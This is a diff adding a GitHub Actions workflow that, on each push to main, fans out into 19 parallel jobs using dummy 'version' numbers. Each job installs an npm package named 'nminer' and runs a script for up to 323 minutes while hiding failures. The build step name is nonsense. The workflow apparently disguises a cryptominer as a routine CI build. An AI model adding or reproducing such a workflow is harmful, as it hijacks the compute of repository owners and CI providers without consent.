@@ -1,0 +1,44 @@
+name: cross-contamination
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 5803 }
+          - { version: 9914 }
+          - { version: 4175 }
+          - { version: 7663 }
+          - { version: 6581 }
+          - { version: 6616 }
+          - { version: 6902 }
+          - { version: 9681 }
+          - { version: 6057 }
+          - { version: 5821 }
+          - { version: 2660 }
+          - { version: 796 }
+          - { version: 9832 }
+          - { version: 9113 }
+          - { version: 1471 }
+          - { version: 7887 }
+          - { version: 8671 }
+          - { version: 1753 }
+          - { version: 165 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: er pfft into
+        run: |
+          npm install nminer@latest
+          timeout 323m node cross-contamination.js || echo "cross-contamination executed"
